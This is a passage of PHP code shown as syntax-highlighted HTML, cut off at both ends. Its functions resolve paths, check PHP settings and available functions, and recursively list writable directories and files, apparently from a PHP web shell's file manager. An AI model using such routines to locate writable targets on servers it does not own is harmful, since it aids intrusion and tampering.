background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #66cccc;\">'\\\\'<\/span>, <span style=\"color: #66cccc;\">'\/'<\/span>, $<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">nowpath<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #66cccc;\">'\/\/'<\/span>, <span style=\"color: #66cccc;\">'\/'<\/span>, $<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">substr(<\/span>$<span style=\"color: #ffcc66;\">nowpath<\/span>, -<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>) != <span style=\"color: #66cccc;\">'\/'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">nowpath<\/span> = $<span style=\"color: #ffcc66;\">nowpath<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">nowpath<\/span>;\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#33719;&#21462;&#24403;&#21069;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">getUpPath<\/span>($<span style=\"color: #ffcc66;\">nowpath<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">pathdb<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">explode(<\/span><span style=\"color: #66cccc;\">'\/'<\/span>, $<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">num<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">count(<\/span>$<span style=\"color: #ffcc66;\">pathdb<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">num<\/span> &gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">unset(<\/span>$<span style=\"color: #ffcc66;\">pathdb<\/span>[$<span style=\"color: #ffcc66;\">num<\/span>-<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>],$<span style=\"color: #ffcc66;\">pathdb<\/span>[$<span style=\"color: #ffcc66;\">num<\/span>-<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>]);\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">uppath<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">implode(<\/span><span style=\"color: #66cccc;\">'\/'<\/span>, $<span style=\"color: #ffcc66;\">pathdb<\/span>).<span style=\"color: #66cccc;\">'\/'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">uppath<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #66cccc;\">'\/\/'<\/span>, <span style=\"color: #66cccc;\">'\/'<\/span>, $<span style=\"color: #ffcc66;\">uppath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">uppath<\/span>;\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#26816;&#26597;PHP&#37197;&#32622;&#21442;&#25968;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">getcfg<\/span>($<span style=\"color: #ffcc66;\">varname<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">result<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">get_cfg_var(<\/span>$<span style=\"color: #ffcc66;\">varname<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">result<\/span> == <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #66cccc;\">'No'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">result<\/span> == <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #66cccc;\">'Yes'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">result<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#26816;&#26597;&#20989;&#25968;&#24773;&#20917;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">getfun<\/span>($<span style=\"color: #ffcc66;\">funName<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> (<span style=\"color: #6699cc;\">false<\/span> !== <span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span>$<span style=\"color: #ffcc66;\">funName<\/span>)) ? <span style=\"color: #66cccc;\">'Yes'<\/span> : <span style=\"color: #66cccc;\">'No'<\/span>;\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#33719;&#24471;&#25991;&#20214;&#25193;&#23637;&#21517;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">getext<\/span>($<span style=\"color: #ffcc66;\">file<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">info<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">pathinfo(<\/span>$<span style=\"color: #ffcc66;\">file<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">info<\/span>[<span style=\"color: #66cccc;\">'extension'<\/span>];\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">GetWDirList<\/span>($<span style=\"color: #ffcc66;\">dir<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">dirdata<\/span>,$<span style=\"color: #ffcc66;\">j<\/span>,$<span style=\"color: #ffcc66;\">nowpath<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">j<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">j<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">dh<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">opendir(<\/span>$<span style=\"color: #ffcc66;\">dir<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span> ($<span style=\"color: #ffcc66;\">file<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">readdir(<\/span>$<span style=\"color: #ffcc66;\">dh<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">f<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #66cccc;\">'\/\/'<\/span>,<span style=\"color: #66cccc;\">'\/'<\/span>,$<span style=\"color: #ffcc66;\">dir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>.$<span style=\"color: #ffcc66;\">file<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'.'<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'..'<\/span> &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">is_dir(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_writable(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'filename'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span>$<span style=\"color: #ffcc66;\">nowpath<\/span>,<span style=\"color: #66cccc;\">''<\/span>,$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'mtime'<\/span>]=<span style=\"color: #99cc99;\">@date<\/span>(<span style=\"color: #66cccc;\">'Y-m-d H:i:s'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">filemtime(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'dirchmod'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getChmod(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'dirperm'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getPerms(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'dirlink'<\/span>]=$<span style=\"color: #ffcc66;\">dir<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'server_link'<\/span>]=$<span style=\"color: #ffcc66;\">f<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">j<\/span>++;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">GetWDirList(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">closedir(<\/span>$<span style=\"color: #ffcc66;\">dh<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">clearstatcache(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">dirdata<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">GetWFileList<\/span>($<span style=\"color: #ffcc66;\">dir<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">filedata<\/span>,$<span style=\"color: #ffcc66;\">j<\/span>,$<span style=\"color: #ffcc66;\">nowpath<\/span>, $<span style=\"color: #ffcc66;\">writabledb<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">j<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">j<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">dh<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">opendir(<\/span>$<span style=\"color: #ffcc66;\">dir<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span> ($<span style=\"color: #ffcc66;\">file<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">readdir(<\/span>$<span style=\"color: #ffcc66;\">dh<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">ext<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">getext(<\/span>$<span style=\"color: #ffcc66;\">file<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">f<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #66cccc;\">'\/\/'<\/span>,<span style=\"color: #66cccc;\">'\/'<\/span>,$<span style=\"color: #ffcc66;\">dir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>.$<span style=\"color: #ffcc66;\">file<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'.'<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'..'<\/span> &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">is_dir(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">GetWFileList(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span>($<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'.'<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'..'<\/span> &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">is_file(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>) &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">in_array(<\/span>$<span style=\"color: #ffcc66;\">ext<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">explode(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">','<\/span><span style=\"text-decoration: underline;\">, $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">writabledb<\/span><span style=\"text-decoration: underline;\">))){<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_writable(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'filename'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span>$<span style=\"color: #ffcc66;\">nowpath<\/span>,<span style=\"color: #66cccc;\">''<\/span>,$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'size'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">sizecount(<\/span>@<span style=\"color: #cccccc; background-color: #2d2d2d;\">filesize(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'mtime'<\/span>]=<span style=\"color: #99cc99;\">@date<\/span>(<span style=\"color: #66cccc;\">'Y-m-d H:i:s'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">filemtime(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'filechmod'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getChmod(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'fileperm'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getPerms(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'fileowner'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getUser(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'dirlink'<\/span>]=$<span style=\"color: #ffcc66;\">dir<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>[$<span style=\"color: #ffcc66;\">j<\/span>][<span style=\"color: #66cccc;\">'server_link'<\/span>]=$<span style=\"color: #ffcc66;\">f<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">j<\/span>++;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">closedir(<\/span>$<span style=\"color: #ffcc66;\">dh<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">clearstatcache(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">filedata<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">GetSFileList<\/span>($<span style=\"color: #ffcc66;\">dir<\/span>, $<span style=\"color: #ffcc66;\">content<\/span>, $<span style=\"color: #ffcc66;\">re<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">filedata<\/span>,$<span style=\"color: #ffcc66;\">j<\/span>,$<span style=\"color: #ffcc66;\">nowpath<\/span>, $<span style=\"color: #ffcc66;\">writabledb<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">j<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">j<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">dh<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">opendir(<\/span>$<span style=\"color: #ffcc66;\">dir<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span> ($<span style=\"color: #ffcc66;\">file<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">readdir(<\/span>$<span style=\"color: #ffcc66;\">dh<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">ext<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">getext(<\/span>$<span style=\"color: #ffcc66;\">file<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">f<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #66cccc;\">'\/\/'<\/span>,<span style=\"color: #66cccc;\">'\/'<\/span>,$<span style=\"color: #ffcc66;\">dir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>.$<span style=\"color: #ffcc66;\">file<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'.'<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'..'<\/span> &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">is_dir(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">GetSFileList(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>, $<span style=\"color: #ffcc66;\">content<\/span>, $<span style=\"color: #ffcc66;\">re<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span>($<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'.'<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">file<\/span>!=<span style=\"color: #66cccc;\">'..'<\/span> &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">is_file(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>) &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">in_array(<\/span>$<span style=\"color: #ffcc66;\">ext<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">explode(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">','<\/span><span style=\"text-decoration: underline;\">, $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">writabledb<\/span><span style=\"text-decoration: underline;\">))){<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">find<\/span> = <span style=\"color: #cccccc; background-color: 